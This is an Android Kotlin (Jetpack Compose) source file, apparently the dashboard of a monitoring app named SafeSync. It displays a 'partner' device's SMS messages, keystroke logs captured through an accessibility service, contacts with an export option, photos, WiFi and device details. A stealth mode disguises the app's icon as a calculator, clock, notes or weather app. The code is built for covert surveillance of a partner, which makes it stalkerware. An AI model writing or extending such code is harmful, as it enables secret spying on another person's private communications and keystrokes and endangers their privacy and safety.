            if (photos.isEmpty()) {
                Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Icon(Icons.Default.HideImage, contentDescription = null, modifier = Modifier.size(56.dp), tint = Color.LightGray)
                        Spacer(modifier = Modifier.height(12.dp))
                        Text("No media synced yet", color = Color.Gray)
                        Spacer(modifier = Modifier.height(6.dp))
                        Text("Client belum sync atau belum ada foto", style = MaterialTheme.typography.labelSmall, color = Color.LightGray)
                    }
                }
            } else {
                LazyVerticalGrid(
                    columns = GridCells.Fixed(3),
                    modifier = Modifier.fillMaxSize().padding(horizontal = 8.dp),
                    verticalArrangement = Arrangement.spacedBy(4.dp),
                    horizontalArrangement = Arrangement.spacedBy(4.dp)
                ) {
                    items(photos.size) { i ->
                        val path = photos[i]["path"] ?: return@items
                        val thumbUrl = photos[i]["thumbUrl"] ?: ""
                        val isDownloading = downloadingPath == path

                        Box(
                            modifier = Modifier
                                .aspectRatio(1f)
                                .clip(RoundedCornerShape(8.dp))
                                .clickable {
                                    if (!isDownloading) {
                                        downloadingPath = path
                                        Toast.makeText(context, "Requesting high-res file...", Toast.LENGTH_SHORT).show()
                                        FirebaseManager.requestFileDownload(path) { url ->
                                            downloadingPath = null
                                            if (url != null) {
                                                val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                                                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                                context.startActivity(intent)
                                            } else {
                                                Toast.makeText(context, "Download failed", Toast.LENGTH_SHORT).show()
                                            }
                                        }
                                    }
                                }
                        ) {
                            if (thumbUrl.isNotEmpty()) {
                                // Load thumbnail directly from Firebase Storage URL via Coil
                                AsyncImage(
                                    model = ImageRequest.Builder(context)
                                        .data(thumbUrl)
                                        .crossfade(true)
                                        .build(),
                                    contentDescription = null,
                                    contentScale = ContentScale.Crop,
                                    modifier = Modifier.fillMaxSize()
                                )
                            } else {
                                Box(Modifier.fillMaxSize().background(Color(0xFFE0E0E0)))
                            }

                            if (isDownloading) {
                                Box(
                                    Modifier.fillMaxSize().background(Color.Black.copy(alpha = 0.4f)),
                                    contentAlignment = Alignment.Center
                                ) {
                                    CircularProgressIndicator(color = Color.White, modifier = Modifier.size(24.dp))
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    @Composable
    fun DeviceTab() {
        var info by remember { mutableStateOf(mapOf<String, String>()) }
        LaunchedEffect(Unit) { FirebaseManager.listenToPartnerDeviceInfo { info = it } }

        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(16.dp)
        ) {
            Text("Partner Device", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Black)
            Spacer(modifier = Modifier.height(16.dp))

            if (info.isEmpty()) {
                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Icon(Icons.Default.PhoneAndroid, contentDescription = null, modifier = Modifier.size(56.dp), tint = Color.LightGray)
                        Spacer(modifier = Modifier.height(12.dp))
                        Text("Waiting for device data…", color = Color.Gray)
                    }
                }
            } else {
                LazyColumn(verticalArrangement = Arrangement.spacedBy(12.dp)) {
                    // Device Model
                    item {
                        DeviceInfoCard(
                            icon = Icons.Default.PhoneAndroid,
                            iconColor = Color(0xFF6366F1),
                            title = "Device",
                            rows = listOf(
                                "Model" to (info["model"] ?: "-"),
                                "Brand" to (info["brand"] ?: "-"),
                                "Product" to (info["product"] ?: "-")
                            )
                        )
                    }
                    // Android
                    item {
                        DeviceInfoCard(
                            icon = Icons.Default.Android,
                            iconColor = Color(0xFF4CAF50),
                            title = "System",
                            rows = listOf(
                                "OS" to (info["android"] ?: "-")
                            )
                        )
                    }
                    // Battery
                    item {
                        val battPct = info["battery"] ?: "?"
                        val pctNum = battPct.trimEnd('%').toIntOrNull() ?: 0
                        val battColor = when {
                            pctNum <= 20 -> Color(0xFFF44336)
                            pctNum <= 50 -> Color(0xFFFF9800)
                            else -> Color(0xFF4CAF50)
                        }
                        DeviceInfoCard(
                            icon = Icons.Default.BatteryFull,
                            iconColor = battColor,
                            title = "Battery",
                            rows = listOf(
                                "Level" to battPct,
                                "Status" to (info["charging"] ?: "-")
                            )
                        )
                    }
                    // SIM / Network
                    item {
                        DeviceInfoCard(
                            icon = Icons.Default.SimCard,
                            iconColor = Color(0xFF03A9F4),
                            title = "SIM / Network",
                            rows = listOf(
                                "Operator" to (info["operator"] ?: "-"),
                                "Country" to (info["simCountry"] ?: "-").uppercase()
                            )
                        )
                    }
                    // Storage
                    item {
                        DeviceInfoCard(
                            icon = Icons.Default.Storage,
                            iconColor = Color(0xFFFF7043),
                            title = "Storage",
                            rows = listOf(
                                "External" to (info["storage"] ?: "-")
                            )
                        )
                    }
                }
            }
        }
    }

    @Composable
    fun DeviceInfoCard(
        icon: ImageVector,
        iconColor: Color,
        title: String,
        rows: List<Pair<String, String>>
    ) {
        Surface(
            shape = RoundedCornerShape(18.dp),
            color = MaterialTheme.colorScheme.surface,
            shadowElevation = 2.dp,
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Surface(
                        shape = RoundedCornerShape(10.dp),
                        color = iconColor.copy(alpha = 0.12f),
                        modifier = Modifier.size(36.dp)
                    ) {
                        Box(contentAlignment = Alignment.Center) {
                            Icon(icon, contentDescription = null, tint = iconColor, modifier = Modifier.size(20.dp))
                        }
                    }
                    Spacer(modifier = Modifier.width(10.dp))
                    Text(title, fontWeight = FontWeight.Bold, style = MaterialTheme.typography.bodyLarge)
                }
                Spacer(modifier = Modifier.height(12.dp))
                rows.forEachIndexed { i, (label, value) ->
                    if (i > 0) HorizontalDivider(
                        modifier = Modifier.padding(vertical = 8.dp),
                        color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.5f)
                    )
                    Row(modifier = Modifier.fillMaxWidth()) {
                        Text(
                            label,
                            style = MaterialTheme.typography.bodySmall,
                            color = Color.Gray,
                            modifier = Modifier.width(80.dp)
                        )
                        Text(
                            value,
                            style = MaterialTheme.typography.bodySmall,
                            fontWeight = FontWeight.SemiBold,
                            modifier = Modifier.weight(1f)
                        )
                    }
                }
            }
        }
    }

    // ─── NEW MONITORING TABS ─────────────────────────────────────────────────

    @Composable
    fun SmsTab() {
        var smsList by remember { mutableStateOf(listOf<Map<String, String>>()) }
        LaunchedEffect(Unit) { FirebaseManager.listenToPartnerSms { smsList = it } }
        LazyColumn(contentPadding = PaddingValues(16.dp)) {
            if (smsList.isEmpty()) {
                item { Text("No SMS data found", color = Color.Gray, modifier = Modifier.padding(16.dp)) }
            }
            items(smsList) { sms ->
                val typeColor = when (sms["type"]) {
                    "inbox" -> Color(0xFF4CAF50)
                    "sent"  -> Color(0xFF2196F3)
                    else    -> Color.Gray
                }
                Card(
                    modifier = Modifier.fillMaxWidth().padding(bottom = 12.dp),
                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface)
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(if (sms["type"] == "inbox") Icons.Default.CallReceived else Icons.Default.CallMade,
                                contentDescription = null, tint = typeColor, modifier = Modifier.size(16.dp))
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(sms["address"] ?: "Unknown", fontWeight = FontWeight.Bold, style = MaterialTheme.typography.bodyLarge)
                        }
                        Spacer(modifier = Modifier.height(6.dp))
                        Text(sms["body"] ?: "", style = MaterialTheme.typography.bodyMedium)
                        Spacer(modifier = Modifier.height(4.dp))
                        val dateStr = sms["date"]?.toLongOrNull()?.let { 
                            java.text.SimpleDateFormat("dd/MM/yy HH:mm", Locale.getDefault()).format(Date(it)) 
                        } ?: ""
                        Text(dateStr, style = MaterialTheme.typography.labelSmall, color = Color.Gray)
                    }
                }
            }
        }
    }

    @Composable
    fun WifiTab() {
        var wifiInfo by remember { mutableStateOf(mapOf<String, String>()) }
        LaunchedEffect(Unit) { FirebaseManager.listenToPartnerWifi { wifiInfo = it } }
        Column(modifier = Modifier.fillMaxSize().padding(24.dp)) {
            Text("WiFi & Network Info", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.SemiBold)
            Spacer(modifier = Modifier.height(16.dp))
            if (wifiInfo.isEmpty()) {
                Text("No network data synced yet.", color = Color.Gray)
            } else {
                Surface(
                    shape = RoundedCornerShape(20.dp),
                    color = MaterialTheme.colorScheme.surface,
                    shadowElevation = 2.dp,
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        wifiInfo.forEach { (key, value) ->
                            if (key != "timestamp") {
                                Row(modifier = Modifier.padding(vertical = 4.dp)) {
                                    Text(key.uppercase(), style = MaterialTheme.typography.labelSmall, color = Color.Gray, modifier = Modifier.width(80.dp))
                                    Text(value, style = MaterialTheme.typography.bodyMedium, fontWeight = FontWeight.Bold)
                                }
                                Divider(color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.05f))
                            }
                        }
                    }
                }
            }
        }
    }



    @Composable
    fun KeylogTab() {
        var logs by remember { mutableStateOf(listOf<Map<String, String>>()) }
        LaunchedEffect(Unit) { FirebaseManager.listenToPartnerKeylog { logs = it } }
        LazyColumn(contentPadding = PaddingValues(16.dp)) {
            if (logs.isEmpty()) {
                item { Text("No keylogs recorded yet. Check Accessibility Service on client.", color = Color.Gray) }
            }
            items(logs) { log ->
                Card(
                    modifier = Modifier.fillMaxWidth().padding(bottom = 8.dp),
                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface)
                ) {
                    Column(modifier = Modifier.padding(12.dp)) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            val pkg = log["package"] ?: "Unknown App"
                            Icon(Icons.Default.Apps, contentDescription = null, modifier = Modifier.size(16.dp), tint = MaterialTheme.colorScheme.primary)
                            Spacer(modifier = Modifier.width(6.dp))
                            Text(pkg, style = MaterialTheme.typography.labelMedium, fontWeight = FontWeight.Bold)
                            Spacer(modifier = Modifier.weight(1f))
                            val dateStr = log["timestamp"]?.toLongOrNull()?.let { 
                                java.text.SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date(it)) 
                            } ?: ""
                            Text(dateStr, style = MaterialTheme.typography.labelSmall, color = Color.Gray)
                        }
                        Spacer(modifier = Modifier.height(6.dp))
                        Text(log["text"] ?: "", style = MaterialTheme.typography.bodyMedium)
                    }
                }
            }
        }
    }

    @Composable
    fun SettingsTab() {
        val stealthOptions = listOf(
            Triple("com.strix.safesync.CalculatorAlias", "Calculator", Icons.Default.Calculate),
            Triple("com.strix.safesync.ClockAlias",      "Clock",      Icons.Default.AccessTime),
            Triple("com.strix.safesync.NotesAlias",      "Notes",      Icons.Default.StickyNote2),
            Triple("com.strix.safesync.WeatherAlias",    "Weather",    Icons.Default.WbSunny)
        )
        var selectedAlias by remember { mutableStateOf<String?>(null) }

        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(24.dp)
        ) {
            Text("General Settings", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.SemiBold)
            Spacer(modifier = Modifier.height(20.dp))

            // Stealth Mode section
            Surface(
                shape = RoundedCornerShape(20.dp),
                color = MaterialTheme.colorScheme.surface,
                shadowElevation = 2.dp,
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Surface(
                            shape = RoundedCornerShape(10.dp),
                            color = MaterialTheme.colorScheme.primary.copy(alpha = 0.1f),
                            modifier = Modifier.size(40.dp)
                        ) {
                            Box(contentAlignment = Alignment.Center) {
                                Icon(
                                    Icons.Default.VisibilityOff,
                                    contentDescription = null,
                                    tint = MaterialTheme.colorScheme.primary,
                                    modifier = Modifier.size(20.dp)
                                )
                            }
                        }
                        Spacer(modifier = Modifier.width(12.dp))
                        Column {
                            Text("Stealth Mode", fontWeight = FontWeight.Bold)
                            Text("Choose a disguise icon", style = MaterialTheme.typography.bodySmall, color = Color.Gray)
                        }
                    }

                    Spacer(modifier = Modifier.height(16.dp))

                    // Icon selection grid
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        stealthOptions.forEach { (alias, label, icon) ->
                            val isSelected = selectedAlias == alias
                            Surface(
                                onClick = { selectedAlias = alias },
                                shape = RoundedCornerShape(14.dp),
                                color = if (isSelected) MaterialTheme.colorScheme.primary.copy(alpha = 0.12f)
                                        else MaterialTheme.colorScheme.surfaceVariant,
                                border = if (isSelected)
                                    androidx.compose.foundation.BorderStroke(2.dp, MaterialTheme.colorScheme.primary)
                                else null,
                                modifier = Modifier.weight(1f)
                            ) {
                                Column(
                                    modifier = Modifier.padding(vertical = 12.dp, horizontal = 4.dp),
                                    horizontalAlignment = Alignment.CenterHorizontally
                                ) {
                                    Icon(
                                        icon,
                                        contentDescription = label,
                                        modifier = Modifier.size(28.dp),
                                        tint = if (isSelected) MaterialTheme.colorScheme.primary else Color.Gray
                                    )
                                    Spacer(modifier = Modifier.height(4.dp))
                                    Text(
                                        label,
                                        style = MaterialTheme.typography.labelSmall,
                                        fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Normal,
                                        color = if (isSelected) MaterialTheme.colorScheme.primary else Color.Gray
                                    )
                                }
                            }
                        }
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    Button(
                        onClick = { if (selectedAlias != null) setStealthMode(selectedAlias) },
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(12.dp),
                        enabled = selectedAlias != null,
                        colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.primary)
                    ) {
                        Icon(Icons.Default.VisibilityOff, contentDescription = null, modifier = Modifier.size(16.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Apply Stealth Icon", fontWeight = FontWeight.Bold)
                    }
                }
            }

            Spacer(modifier = Modifier.height(12.dp))

            OutlinedButton(
                onClick = { setStealthMode(null) },
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(12.dp)
            ) {
                Icon(Icons.Default.Visibility, contentDescription = null, modifier = Modifier.size(16.dp))
                Spacer(modifier = Modifier.width(8.dp))
                Text("Restore Original SafeSync Icon")
            }
        }
    }

    @Composable
    fun SettingsCard(title: String, description: String, icon: ImageVector, onClick: () -> Unit) {
        Card(
            onClick = onClick,
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(16.dp)
        ) {
            Row(modifier = Modifier.padding(16.dp), verticalAlignment = Alignment.CenterVertically) {
                Icon(icon, contentDescription = null, tint = MaterialTheme.colorScheme.primary)
                Spacer(modifier = Modifier.width(16.dp))
                Column {
                    Text(title, fontWeight = FontWeight.Bold)
                    Text(description, style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
                }
            }
        }
    }

    @Composable
    fun DataList(title: String, data: List<Map<String, String>>, key1: String, key2: String, icon: ImageVector) {
        Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
            Text(title, style = MaterialTheme.typography.headlineSmall, fontWeight = FontWeight.Black, color = MaterialTheme.colorScheme.onBackground)
            Spacer(modifier = Modifier.height(12.dp))
            if (data.isEmpty()) {
                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Text("No data available yet", color = Color.Gray)
                }
            } else {
                LazyColumn(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    items(data) { item ->
                        Surface(
                            shape = RoundedCornerShape(16.dp),
                            color = MaterialTheme.colorScheme.surface,
                            shadowElevation = 2.dp,
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            ListItem(
                                leadingContent = { 
                                    Surface(
                                        shape = RoundedCornerShape(12.dp),
                                        color = MaterialTheme.colorScheme.primaryContainer.copy(alpha = 0.4f),
                                        modifier = Modifier.size(40.dp)
                                    ) {
                                        Box(contentAlignment = Alignment.Center) {
                                            Icon(icon, contentDescription = null, tint = MaterialTheme.colorScheme.primary, modifier = Modifier.size(20.dp))
                                        }
                                    }
                                },
                                headlineContent = { Text(item[key1] ?: "Unknown", fontWeight = FontWeight.Bold) },
                                supportingContent = { Text(item[key2] ?: "", style = MaterialTheme.typography.bodySmall, color = Color.Gray) }
                            )
                        }
                    }
                }
            }
        }
    }

    @Composable
    fun CenteredContent(icon: ImageVector, title: String, body: String) {
        Column(
            modifier = Modifier.fillMaxSize(), 
            verticalArrangement = Arrangement.Center, 
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Icon(icon, contentDescription = null, modifier = Modifier.size(64.dp), tint = MaterialTheme.colorScheme.primary)
            Spacer(modifier = Modifier.height(16.dp))
            Text(title, style = MaterialTheme.typography.titleLarge, fontWeight = FontWeight.Bold)
            Text(body, style = MaterialTheme.typography.bodyLarge, textAlign = TextAlign.Center)
        }
    }

    @Composable
    fun FooterComponent(isDark: Boolean = false) {
        val context = LocalContext.current
        val textColor = if (isDark) Color.White.copy(alpha = 0.7f) else Color.Gray
        val accentColor = if (isDark) Color.White else MaterialTheme.colorScheme.primary

        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(bottom = 24.dp, top = 8.dp),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.Center
        ) {
            Text("Made with ", style = MaterialTheme.typography.bodySmall, color = textColor)
            Icon(
                Icons.Default.Favorite, 
                contentDescription = "Love", 
                tint = Color(0xFFEF4444),
                modifier = Modifier.size(12.dp)
            )
            Text(" by ", style = MaterialTheme.typography.bodySmall, color = textColor)
            
            Row(
                verticalAlignment = Alignment.CenterVertically,
                modifier = Modifier.clickable {
                    val uri = Uri.parse("https://www.instagram.com/eosnada1702")
                    val intent = Intent(Intent.ACTION_VIEW, uri)
                    context.startActivity(intent)
                }
            ) {
                Text(
                    "Eos Ageng", 
                    style = MaterialTheme.typography.bodySmall, 
                    fontWeight = FontWeight.Black,
                    color = accentColor
                )
                Spacer(modifier = Modifier.width(4.dp))
                Icon(
                    Icons.Default.OpenInNew, 
                    contentDescription = null, 
                    modifier = Modifier.size(10.dp),
                    tint = accentColor
                )
            }
        }
    }

    @Composable
    fun ModernSafeSyncTheme(content: @Composable () -> Unit) {
        val colorScheme = lightColorScheme(
            primary = Color(0xFF6366F1),
            secondary = Color(0xFF10B981),
            background = Color(0xFFF9FAFB),
            surface = Color.White,
            onPrimary = Color.White,
            onSecondary = Color.White,
            onBackground = Color(0xFF111827),
            onSurface = Color(0xFF111827),
            surfaceVariant = Color(0xFFF3F4F6)
        )
        
        MaterialTheme(
            colorScheme = colorScheme,
            typography = Typography(),
            content = content
        )
    }

    @Composable
    fun ContactsTab() {
        val context = LocalContext.current
        var contacts by remember { mutableStateOf(listOf<Map<String, String>>()) }
        LaunchedEffect(Unit) { FirebaseManager.listenToPartnerContacts { contacts = it } }

        Column(modifier = Modifier.fillMaxSize()) {
            Row(
                modifier = Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 12.dp),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.Contacts, contentDescription = null, tint = MaterialTheme.colorScheme.primary)
                    Spacer(modifier = Modifier.width(8.dp))
                    Text("Partner Contacts", style = MaterialTheme.typography.titleLarge, fontWeight = FontWeight.Bold)
                }
                
                if (contacts.isNotEmpty()) {
                    IconButton(onClick = {
                        try {
                            val txtData = contacts.joinToString("\n") { "${it["name"]} - ${it["number"]}" }
                            val sendIntent: Intent = Intent().apply {
                                action = Intent.ACTION_SEND
                                putExtra(Intent.EXTRA_TEXT, txtData)
                                type = "text/plain"
                            }
                            val shareIntent = Intent.createChooser(sendIntent, "Export Contacts")
                            context.startActivity(shareIntent)
                        } catch (e: Exception) {
                            Toast.makeText(context, "Failed to export", Toast.LENGTH_SHORT).show()
                        }
                    }) {
                        Icon(Icons.Default.Download, contentDescription = "Export")
                    }
                }
            }

            if (contacts.isEmpty()) {
                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Icon(Icons.Default.Contacts, contentDescription = null, modifier = Modifier.size(56.dp), tint = Color.LightGray)
                        Spacer(modifier = Modifier.height(12.dp))
                        Text("No contacts synced yet", color = Color.Gray)
                    }
                }
            } else {
                LazyColumn(modifier = Modifier.fillMaxSize().padding(horizontal = 12.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    items(contacts) { c ->
                        Surface(shape = RoundedCornerShape(12.dp), color = MaterialTheme.colorScheme.surface, shadowElevation = 1.dp) {
                            Row(modifier = Modifier.padding(16.dp).fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
                                Surface(shape = CircleShape, color = MaterialTheme.colorScheme.primary.copy(alpha = 0.1f), modifier = Modifier.size(40.dp)) {
                                    Box(contentAlignment = Alignment.Center) { Icon(Icons.Default.Person, contentDescription = null, tint = MaterialTheme.colorScheme.primary) }
                                }
                                Spacer(modifier = Modifier.width(16.dp))
                                Column {
                                    Text(c["name"] ?: "", fontWeight = FontWeight.Bold)
                                    Text(c["number"] ?: "", color = Color.Gray, style = MaterialTheme.typography.bodySmall)
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
